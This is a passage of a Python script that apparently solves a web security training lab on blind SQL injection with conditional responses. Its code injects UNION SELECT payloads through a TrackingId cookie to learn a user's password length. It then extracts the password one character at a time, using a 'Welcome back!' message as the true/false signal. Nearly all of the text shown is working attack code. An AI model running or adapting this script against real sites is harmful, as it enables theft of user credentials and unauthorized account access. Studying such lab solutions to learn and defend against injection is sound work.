...
def check_welcome(text: str) -> bool:
    """Check if the response contains 'Welcome back!' indicating a true condition."""
...
async def get_password_length(
    ...
    """Determine the password length by testing LENGTH(password)=N."""
    for length in range(1, max_length + 1):
        payload = f"' UNION SELECT NULL FROM users WHERE username='{username}' AND LENGTH(password)={length}--"
        headers = {"Cookie": f"TrackingId={payload}; session={session}"}
        try:
            async with client.get(url, headers=headers, ssl=False) as res:
                text = await res.text()
                if check_welcome(text):
...
async def extract_password(
    ...
    for pos in range(1, password_length + 1):
        found = False
        for char in chars:
            payload = f"' UNION SELECT NULL FROM users WHERE username='{username}' AND SUBSTRING(password,{pos},1)='{char}'--"
            headers = {"Cookie": f"TrackingId={payload}; session={session}"}
            try:
                async with client.get(url, headers=headers, ssl=False) as res:
                    text = await res.text()
...
async def main():
    parser = argparse.ArgumentParser(
        description="Solve Lab: Blind SQL injection with conditional responses"
    )
    parser.add_argument(
